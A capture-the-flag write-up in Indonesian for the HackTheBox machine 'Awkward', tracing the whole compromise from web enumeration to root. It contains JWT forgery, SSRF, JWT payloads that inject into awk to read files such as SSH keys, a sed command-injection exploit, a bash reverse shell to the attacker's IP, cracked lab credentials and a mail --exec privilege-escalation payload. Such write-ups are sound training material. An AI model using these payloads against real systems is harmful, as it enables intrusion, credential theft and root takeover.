---
title: "HackTheBox - Awkward WriteUps"
date: 2022-12-20 02:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Awkward WriteUps

Scanning dengan Nmap seperti biasa dan kita bisa melihat Port yang terbuka seperti Port 22 SSH dan Port 80 http nginx 1.18.0. Selanjutnya kita mencoba fokus pada Port 80 http.
![image](https://media.discordapp.net/attachments/740245586095112242/1057838016195997707/image.png)

Kita mencoba fuzzing directory dan mendapatkan directory seperti gambar dibawah, disini dari fuzzing directory tidak ditemukan directory yang memungkinkan exploitasi. Kita mencoba dengan cara lain.
![image](https://media.discordapp.net/attachments/740245586095112242/1057838265752899634/image.png)

Disini kita melihat source code html dan mendapatkan file app.js yang berada pada directory javascript. Dan disini kita mencoba mencari directory maupun informasi yang penting pada website:

![image](https://media.discordapp.net/attachments/740245586095112242/1057838565821796373/image.png)

Kita menemukan directory /hr yang mengarah pada login panel, directory ```/dashboard``` yang mengarah pada directory ```/hr```. kami juga menemukan directory yang ada pada Api, seperti: ```all-leave, submit-leave, login, staff-details, store-status```.
![image](https://media.discordapp.net/attachments/740245586095112242/1057838787071332463/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057838832680185906/image.png)

Setelah kita mencoba login panelnya kita disuguhkan login dengan parameter username dan password. Dari sini kita juga belum mempunyai username dan password tersebut. Setelah mencari cari ada kerentenan apa di login panel ini. Kita mendapatkan sesuatu yang ada di extension cookie firefox. Disini memperlihatkan bahwa value pada token terdapat nama ```guest```, kita mencoba mengubah ```guest``` menjadi ```admin```. Dan ternyata kita bisa langsung masuk ke dalam admin dashboard tidak memerlukan username dan password. Kerentanan ini mungkin bisa dinamakan ```Bypass Admin dengan mengubah value pada token```. Tapi kalau lihat ada section untuk detail staf yang kosong dan statusnya ```store is down```
![image](https://media.discordapp.net/attachments/740245586095112242/1057839149245288458/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057839227133513768/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057839329705205770/image.png)

Selanjutnya kita mencari lagi didalam dashboard ini tidak ada file uploader atau sesuatu yang menarik. Kita menemukan dengan melihat Network pada inspect element. Kita menemukan Api yang terhubung pada ```/api/staff-details, /api/store-status?url=”http://sote.hat-valley.htb”```

![image](https://media.discordapp.net/attachments/740245586095112242/1057840058369065010/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057840077671252008/image.png)

Kita mencoba membuka directory ```/api/staff-details``` mendapatkan tampilan error. Disini dari cookie editor editor mendapatkan token, disini kita juga mencoba bypass cookie dengan cara mengapus token cookie.
![image](https://media.discordapp.net/attachments/740245586095112242/1057840391220641812/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057840412892598332/image.png)

Setelah menghapusnya dan merefresh tampilan yang ada pada website, kita mendapatkan perubahan tampilan dan disini kita mendapatkan information sensitive. Information sensitive ini terdapat username dan password, tetapi disini password yang kita dapatkan terenkripsi dengan hash.
![image](https://media.discordapp.net/attachments/740245586095112242/1057842168439521351/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057842772532539402/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057842883207643246/image.png)

Dan setelah kita mencoba hash apa yang digunakan password ini kita mendapatkan hash SHA-256 yang kemungkinan. Disini kita mencoba langsung cracking password hash dengan john ripper dengan wordlist rockyou. Setelah cracking selesai kita dapat melihat password dengan nama ```chris123``` dengan username ```christopher.jones```
![image](https://media.discordapp.net/attachments/740245586095112242/1057843136870760479/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057843164989374614/image.png)

Setelah mendapatkanya kita langsung mencoba menggunakan password ini untuk login kedalam dashboard lagi. Dan ternyata mendapatkan response sukses masuk kedalam dashboard admin dengan username dan password tersebut.
![image](https://media.discordapp.net/attachments/740245586095112242/1057843609526866030/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057843633744789505/image.png)

Disini kita melihat lagi cookie editor tersebut juga berubah dengan id yang didapat tadi. Kita mencoba cracking token value yang didapat dengan tools john. Disini kita berhasil cracking password hash yaitu ```123beany123```.
![image](https://media.discordapp.net/attachments/740245586095112242/1057843925618016346/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057843959117910096/image.png)

Kita mencoba melihat yang didapat dari Request Network tadi, dan disini kita mencoba menyambungkan ke pc kita untuk mengecek apakah website ini terdapat kerentanan SSRF atau tidak. Dan ternyata disini kita dapat Response dari penginputan pada parameter ```url=``` kita mendapatkan directory dari website kita sendiri.
![image](https://media.discordapp.net/attachments/740245586095112242/1057844284025491486/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057844315159789578/image.png)

Kita mencoba fuzzing lagi dengan mengubah ```http://127.0.0.1:FUZZ``` dan disini mendapatkan 3 status code 200 yang menandakan Response dari Fuzzing ini dapat kita lihat secara langsung. Diperlukan URL API endpoint untuk memeriksa statusnya yang dapat kami coba SSRF: ```Pertama, saya mencoba localhostURL dengan 80port```, dan dialihkan ke ```http://hat-valley.htb/```
![image](https://media.discordapp.net/attachments/740245586095112242/1057844944485744741/image.png)

Kita melihat source code yang ada pada semua yang didapat dari Fuzzing tadi. Dan pada ```http://127.0.0.1:8080``` dan lihat pada perubahan pada source code yang didapat
![image](https://media.discordapp.net/attachments/740245586095112242/1057845363438006422/image.png)

Saat kita mengubah port ```3002``` kita mendapatkan tampilan yang berbeda, pada port ```3002``` memberi kita semua API rute titik akhir serta source code yang ada di port ini, Ditemukan endpoint yang rentan terhadap LFI Perintahnya AWK adalah vulnerable. Jadi pada kerentanan ini dijelaskan bahwa AWK command Melewati variabel pengguna yang memiliki nilai yang didekodekan yang JWT token username dapat kita ubah apa pun yang kita inginkan.
![image](https://media.discordapp.net/attachments/740245586095112242/1057845692128837662/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057845719865757706/image.png)

Karena kami memiliki hidden token JWT, dan kami dapat membuat token dengan apa username dan fields yang kami inginkan, example:
![image](https://media.discordapp.net/attachments/740245586095112242/1057845987512688660/image.png)

Jika kita disini meneruskan sebagai nama pengguna, ```/' /etc/passwd '```kami mendapatkan hasil yang kita inginkan. Kita mendapatkan cookie dari request yang kita dapat dari cookie editor ataupun burpsuite. Kasus ini bila kita menggunakan ```jwt.io``` dan kita dapat mengubah pada Payload di parameter ```username```, disni mencoba mengubah payload dengan yang kita inginkan.
![image](https://media.discordapp.net/attachments/740245586095112242/1057846432939388979/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057846451910217748/image.png)

Dari hasil payload tadi bila Cookie token kita ubah pada headernya dengan yang terbaru. Disini kita bisa menemukan kerentanan LFI yang dapat membaca isi ```/etc/passwd``` pada website target. Dan gambar dibawah dijelaskan saya mencoba untuk mencari information sensitive yang ada di server dengan kerentanan LFI.
![image](https://media.discordapp.net/attachments/740245586095112242/1057846809063600198/image.png)
```
{
  "username": "/' /home/christine/.ssh/id_rsa '",
  "iat": 1667017157
}
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057846931570827295/image.png)

Dan kita mendapatkan backup file pada directory ```/Document/```. Disini terdapat directory backup yang ada file ```bean_backup_final.tar.gz```. selanjutnya mencoba download file tersebut dan menextrasknya.
```
{
  "username": "/' /home/bean/Documents/backup_home.sh '",
  "iat": 1667017157
}
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057847713519108146/image.png)
```
{
  "username": "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '",
  "iat": 1667017157
}
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057847895728083004/image.png)

Disini mungkin akan dapat information sensitive lagi, kita mencoba mencarinya lagi yang ada pada backup file tadi. Dan mendapatkan information sensitive pada directory ```.config/xpad/content-DS1ZS1```
![image](https://media.discordapp.net/attachments/740245586095112242/1057848313103257610/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057848426978627614/image.png)

Kita mencoba login dengan information sensitive tadi, dan berhasil masuk pada SSH dengan:
```
user: bean 
password: 014mrbeanrules!#P
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057848703261626398/image.png)

Bila kita melihat hosts nya pada ```/etc/hosts``` kita mendapat subdomain pada ```store.hat-valley.htb```. apabila kita membukanya, kita mendapatkan form login htaccess.
![image](https://media.discordapp.net/attachments/740245586095112242/1057848945809834075/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057849048742240318/image.png)

Disini mencari information sensitive lagi yang dapat login pada subdomain ```store``` tadi. Setelah cracking password: ```014mrbeanrules!#P``` yang didapat kita berhasil masuk pada subdomain ```store```.
![image](https://media.discordapp.net/attachments/740245586095112242/1057849375574986832/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057849404977053716/image.png)

Kita juga mendapatkan source code dari subdomain store web di dalamnya yang terletak pada ```/var/www/store```.
![image](https://media.discordapp.net/attachments/740245586095112242/1057849874034479124/image.png)

Membaca README.mdakan memberitahu kita tentang, 
1.	Mereka tidak menggunakan apapun database sampai sekarang
2.	Mereka menggunakan file untuk menyimpan data di dalam direktori ini
3.	```/product-details``` yang menyimpan detail produk
4.	```/cart``` yang menyimpan item pengguna
5.	Mereka verify produk mereka dengan ***Hat Valley Cart***

![image](https://media.discordapp.net/attachments/740245586095112242/1057850350503211139/image.png)

Memeriksa pada file ```cart_actions.php```:
```php
<?php

$STORE_HOME = "/var/www/store/";

//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
        }
    }
    return false;
}

//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}

?>
```
Saat memeriksa file, dan saya perhatikan ```sed``` perintah ini digunakan untuk menghapus cart data file, yang dapat kita gunakan untuk memungkinan melakukan ```Remote Code Execution```.
![image](https://media.discordapp.net/attachments/740245586095112242/1057851456096567306/image.png)

Kita mencobanya dengan melihat payload yang ada pada [GTFobins](https://gtfobins.github.io/gtfobins/sed/), Jadi kita dapat menggunakan ```-e``` flag yang diberikan dalam bantuan sed command, ini memungkinkan kita untuk pass the script rev shell kita. Jadi mari kita lakukan bagaimana abuse perintah sed itu: 
1. Pertama input kita terlihat seperti ini: 
```bash
' -e "1e /tmp/shell.sh" /tmp/shell.sh '
```
2. Yang akan digantikan oleh ```$item_id```, Example dengan payload:
```bash
system("sed -i '/item_id=' -e "1e /tmp/shell.sh" /tmp/shell.sh '/d' {$STORE_HOME}cart/{$user_id}");
```
Disini kita mencoba mengexploitasikan dengan cara add cart, dan lihat hasil nya pada directory ```/var/www/store/cart``` disini hasilnya dari add cart akan muncul.
![image](https://media.discordapp.net/attachments/740245586095112242/1057853030508277852/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057853143280533564/image.png)

Setelah itu kita buat file dengan code dibawah, dengan nama shell pada directory ```/tmp/``` dan ubah permisionnya menjadi dengan ```chmod +x shell.sh```
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/443 0>&1
```

Selanjutnya ktia copy data yang kita add cart tadi menjadi backup. Dan kita menambahkan payload:
![image](https://media.discordapp.net/attachments/740245586095112242/1057853628859297892/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057853676565319750/image.png)

Dan kita intercept pada burpsuite setelah itu kita remove dan kita akan mendapatkan hasil request code. tambahkan payloadnya dengan yang tadi dan kita sambungkan dengan netcat.
![image](https://media.discordapp.net/attachments/740245586095112242/1057853959160746054/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057854191609073684/image.png)

Disini kita mencoba medownload linpeas dan pspy untuk melihat sesuatu apa yang bisa melihat privileges apa yang bisa kita exploitasikan. Dari hasil log yang kita dapat dengan menscan tadi, kita dapat memodif ```leave_request.csv```
![image](https://media.discordapp.net/attachments/740245586095112242/1057854558547746916/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057854584950890626/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057854616450113666/image.png)

Kita mencoba melihat isi file leave_requests.csv disini terdapat username. Kita mencoba menambahkan dengan cara ```echo “testingyupy” >> leave_requests.csv```
![image](https://media.discordapp.net/attachments/740245586095112242/1057855045770678302/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057855067165818971/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057855097322876998/image.png)

Disini kita mendapatkan log seperti gambar dibawah yang dijelaskan bash menjalankan secara langsung dengan script ```notify.sh```
![image](https://media.discordapp.net/attachments/740245586095112242/1057855369369620530/image.png)

Kita membuat file lagi dengan payload dibawah:

![image](https://media.discordapp.net/attachments/740245586095112242/1057855561527459921/image.png)

Dan menambahkan payload yang saya dapatkan pada [GTFobins](https://gtfobins.github.io/gtfobins/mail/#shell), dijelaskan payload ini akan mengeksekusi ```/tmp/root.sh``` yang bisa menjalankan bash dengan root access
![image](https://media.discordapp.net/attachments/740245586095112242/1057855860807835718/image.png)
```bash
echo '" --exec="\!/tmp/root.sh"' >> leave_requests.csv
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057856332230828072/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057856464875688027/image.png)
